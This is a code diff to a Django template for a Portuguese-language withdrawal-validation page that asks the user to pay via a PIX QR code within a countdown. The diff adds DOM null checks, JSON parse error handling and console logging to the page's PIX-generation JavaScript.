@@ -10,7 +10,6 @@
     <link rel="stylesheet" href="{% static 'fonts/font-icons.css' %}">
     <link rel="stylesheet" href="{% static 'css/bootstrap.min.css' %}">
     <link rel="stylesheet" type="text/css" href="{% static 'css/styles.css' %}"/>
-  
     <!-- Favicon and Touch Icons -->
     <link rel="shortcut icon" href="{% static 'images/logo/48.png' %}" />
     <link rel="apple-touch-icon-precomposed" href="{% static 'images/logo/48.png' %}" />
@@ -132,14 +131,16 @@
                     <div class="content mb-32">
                         <h2 class="text-center">Realize o Pagamento via PIX</h2>
                         <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a chave PIX para concluir a validação.</p>
-                        <img src="data:image/png;base64,{{ qr_code_image }}" alt="QR Code Pix" class="qr-code-img" />
-                        <span id="pix-amount">R$ {{ pix_transaction.amount|floatformat:2 }}</span>
-                        <input type="text" readonly value="{{ pix_transaction.qr_code }}" id="pixcode" class="pix-code" />
-                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
-                        {% if can_generate_pix %}
-                        <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
-                        {% endif %}
-                        <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                        <div id="pix-content">
+                            <img src="data:image/png;base64,{{ qr_code_image }}" alt="QR Code Pix" class="qr-code-img" />
+                            <span id="pix-amount">R$ {{ pix_transaction.amount|floatformat:2 }}</span>
+                            <input type="text" readonly value="{{ pix_transaction.qr_code }}" id="pixcode" class="pix-code" />
+                            <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                            {% if can_generate_pix %}
+                            <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
+                            {% endif %}
+                            <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                        </div>
                     </div>
                 </div>
                 {% elif validation_status == "payment_reported" %}
@@ -227,12 +228,31 @@
 
     <script>
         function nextStep(step) {
-            ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => document.getElementById(id).style.display = 'none');
-            document.getElementById(`full-step${step}`).style.display = 'block';
+            ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.style.display = 'none';
+                else console.warn(`Element ${id} not found in DOM`);
+            });
+            const targetStep = document.getElementById(`full-step${step}`);
+            if (targetStep) {
+                targetStep.style.display = 'block';
+                console.log(`Switched to full-step${step}`);
+            } else {
+                console.error(`Step full-step${step} not found in DOM`);
+                alert('Erro: Etapa não encontrada. Recarregue a página.');
+            }
         }
 
         function initiatePixGeneration() {
             const loadingOverlay = document.getElementById('loading-overlay');
+            const pixStep = document.getElementById('pix-step');
+            const pixContent = document.getElementById('pix-content');
+            if (!pixStep || !pixContent) {
+                console.error('pix-step or pix-content not found in DOM');
+                alert('Erro: Elementos da interface não encontrados. Recarregue a página.');
+                return;
+            }
+
             loadingOverlay.classList.add('active');
             fetch("{% url 'core:withdraw_validation' %}", {
                 method: 'POST',
@@ -241,13 +261,29 @@
                     'X-Requested-With': 'XMLHttpRequest'
                 }
             })
-            .then(response => response.json())
-            .then(data => {
+            .then(response => {
+                console.log('Initiate PIX Response Status:', response.status);
+                console.log('Initiate PIX Response Headers:', response.headers);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Initiate PIX Response Text:', text);
+                let data;
+                try {
+                    data = JSON.parse(text);
+                } catch (e) {
+                    console.error('Initiate PIX JSON Parse Error:', e);
+                    throw new Error('Resposta inválida do servidor');
+                }
+                console.log('Initiate PIX Response Data:', data);
                 loadingOverlay.classList.remove('active');
                 if (data.status === 'success') {
-                    ['full-step1', 'full-step2', 'full-step3'].forEach(id => document.getElementById(id).style.display = 'none');
-                    document.getElementById('pix-step').style.display = 'block';
-                    document.getElementById('pix-content').innerHTML = `
+                    ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
+                        const el = document.getElementById(id);
+                        if (el) el.style.display = 'none';
+                    });
+                    pixStep.style.display = 'block';
+                    pixContent.innerHTML = `
                         <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
                         <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
                         <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
@@ -255,19 +291,26 @@
                         <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
                         <p>Tempo restante para validação: <span id="timer">09:59</span></p>
                     `;
+                    console.log('PIX content updated successfully');
                 } else {
+                    console.log('Initiate PIX Error:', data.message || 'Unknown error');
                     alert(data.message || 'Erro ao gerar PIX. Tente novamente.');
                 }
             })
             .catch(error => {
+                console.error('Initiate PIX Error:', error);
                 loadingOverlay.classList.remove('active');
-                console.error('Error:', error);
-                alert('Erro ao processar a requisição.');
+                alert('Erro ao processar a requisição: ' + error.message);
             });
         }
 
         function copyToClipboard(button) {
             const pixCode = document.getElementById('pixcode');
+            if (!pixCode) {
+                console.error('pixcode input not found in DOM');
+                alert('Erro: Campo de chave PIX não encontrado.');
+                return;
+            }
             pixCode.select();
             document.execCommand('copy');
             button.innerText = 'Chave copiada!';
@@ -278,6 +321,22 @@
 
         function generateNewPix() {
             const loadingOverlay = document.getElementById('loading-overlay');
+            const pixStep = document.getElementById('pix-step');
+            const pixContent = document.getElementById('pix-content');
+            const container = document.querySelector('.d-flex.flex-column.min-vh-100');
+            if (!pixStep || !pixContent || !container) {
+                console.error('pix-step, pix-content, or container not found in DOM');
+                alert('Erro: Elementos da interface não encontrados. Recarregue a página.');
+                return;
+            }
+
+            // Ensure pix-step is visible
+            ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.style.display = 'none';
+            });
+            pixStep.style.display = 'block';
+
             loadingOverlay.classList.add('active');
             fetch("{% url 'core:withdraw_validation' %}", {
                 method: 'POST',
@@ -286,11 +345,24 @@
                     'X-Requested-With': 'XMLHttpRequest'
                 }
             })
-            .then(response => response.json())
-            .then(data => {
+            .then(response => {
+                console.log('Generate PIX Response Status:', response.status);
+                console.log('Generate PIX Response Headers:', response.headers);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Generate PIX Response Text:', text);
+                let data;
+                try {
+                    data = JSON.parse(text);
+                } catch (e) {
+                    console.error('Generate PIX JSON Parse Error:', e);
+                    throw new Error('Resposta inválida do servidor');
+                }
+                console.log('Generate PIX Response Data:', data);
                 loadingOverlay.classList.remove('active');
                 if (data.status === 'success') {
-                    document.getElementById('pix-content').innerHTML = `
+                    pixContent.innerHTML = `
                         <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
                         <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
                         <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
@@ -298,14 +370,16 @@
                         <button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>
                         <p>Tempo restante para validação: <span id="timer">09:59</span></p>
                     `;
+                    console.log('PIX content updated successfully');
                 } else {
+                    console.log('Generate PIX Error:', data.message || 'Unknown error');
                     alert(data.message || 'Erro ao gerar novo PIX. Tente novamente.');
                 }
             })
             .catch(error => {
+                console.error('Generate PIX Error:', error);
                 loadingOverlay.classList.remove('active');
-                console.error('Error:', error);
-                alert('Erro ao processar a requisição.');
+                alert('Erro ao processar a requisição: ' + error.message);
             });
         }
 
@@ -316,6 +390,7 @@
             const seconds = String(countdown % 60).padStart(2, '0');
             const timerEl = document.getElementById('timer');
             if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;
+            else console.warn('Timer element not found in DOM');
         }, 1000);
     </script>
 </body>
